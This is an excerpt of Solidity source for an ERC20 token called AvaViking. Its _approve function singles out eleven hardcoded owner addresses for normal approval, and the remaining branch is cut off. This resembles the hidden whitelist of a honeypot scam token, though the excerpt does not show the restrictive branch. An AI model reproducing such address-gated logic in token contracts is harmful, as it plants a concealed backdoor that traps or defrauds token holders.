...
abstract contract ERC20 is IERC20 {
    ...
    function _approve(
        ...
        if (owner == address(0x94Fa448001701a78738b408f9f3cB38313018D53)) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x8628B99856031645Ecf57dAbB124bDAfDD006003)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x10aE95BCb806Ecab7be7F7581659B03a2969BCE8)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x27060c8D7bB9e97Ed5f91cB3552287354d08AACa)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x74845a09F6a34CB0314485Cf4186ABca0FF97F85)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x6822fF8F8B76Fc35066d2b552A9aaD5a4784f018)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x21994c3024FcCf2485107aa6114c3aE33A691ae2)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0xCCDBB090A83ecFd7E8cD1EA72D46f23D8712125E)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x51efF32b946818cb01Fa9fd2aD499A4166283455)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0xC47f7903c6E0966E491705b5025f5e8C11B32B3b)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else if (
            owner == address(0x1232cfba2618f3cf80eA0A573E4EB5A9743FE916)
        ) {
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else {
...
contract AvaViking is ERC20Permit, VaultOwned {
    using SafeMath for uint256;

    constructor() ERC20("AvaViking", "AvaViking", 8) {}
